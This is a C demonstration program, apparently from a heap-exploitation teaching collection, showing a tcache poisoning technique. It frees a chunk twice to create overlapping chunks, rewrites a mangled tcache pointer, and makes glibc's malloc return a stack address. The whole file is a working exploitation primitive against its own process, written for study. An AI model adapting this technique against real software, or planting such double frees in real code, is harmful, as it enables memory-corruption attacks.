#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>


int main()
{
    /*
     * This attack should bypass the restriction introduced in
     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d
     * If the libc does not include the restriction, you can simply double free the victim and do a
     * simple tcache poisoning
     * And thanks to @anton00b and @subwire for the weird name of this technique */

    // disable buffering so _IO_FILE does not interfere with our heap
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    // introduction
    puts("This file demonstrates a powerful tcache poisoning attack by tricking malloc into");
    puts("returning a pointer to an arbitrary location (in this demo, the stack).");
    puts("This attack only relies on double free.\n");

    // prepare the target
    intptr_t stack_var[4];
    puts("The address we want malloc() to return, namely,");
    printf("the target address is %p.\n\n", stack_var);

    // prepare heap layout
    puts("Preparing heap layout");
    puts("Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.");
    intptr_t *x[7];
    for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++){
        x[i] = malloc(0x100);
    }
    intptr_t *prev = malloc(0x100);
    printf("Allocating a chunk for later consolidation: prev @ %p\n", prev);
    intptr_t *a = malloc(0x100);
    printf("Allocating the victim chunk: a @ %p\n", a);
    puts("Allocating a padding to prevent consolidation.\n");
    malloc(0x10);

    // cause chunk overlapping
    puts("Now we are able to cause chunk overlapping");
    puts("Step 1: fill up tcache list");
    for(int i=0; i<7; i++){
        free(x[i]);
    }
    puts("Step 2: free the victim chunk so it will be added to unsorted bin");
    free(a);

    puts("Step 3: free the previous chunk and make it consolidate with the victim chunk.");
    free(prev);

    puts("Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n");
    malloc(0x100);
    /*VULNERABILITY*/
    free(a);// a is already freed
    /*VULNERABILITY*/

    puts("Now we have the chunk overlapping primitive:");
    puts("This primitive will allow directly reading/writing objects, heap metadata, etc.\n");
    puts("Below will use the chunk overlapping primitive to perform a tcache poisoning attack.");

    puts("Get the overlapping chunk from the unsorted bin.");
    intptr_t *unsorted = malloc(0x100 + 0x100 + 0x10);
    puts("Use the overlapping chunk to control victim->next pointer.");
    // mangle the pointer since glibc 2.32
    unsorted[0x110/sizeof(intptr_t)] = ((long)a >> 12) ^ (long)stack_var;

    puts("Get back victim chunk from tcache. This will put target to tcache top.");
    a = malloc(0x100);
    int a_size = a[-1] & 0xff0;
    printf("victim @ %p, size: %#x, end @ %p\n", a, a_size, (void *)a+a_size);

    puts("Get the target chunk from tcache.");
    intptr_t *target = malloc(0x100);
    target[0] = 0xcafebabe;

    printf("target @ %p == stack_var @ %p\n", target, stack_var);
    assert(stack_var[0] == 0xcafebabe);
    return 0;
}
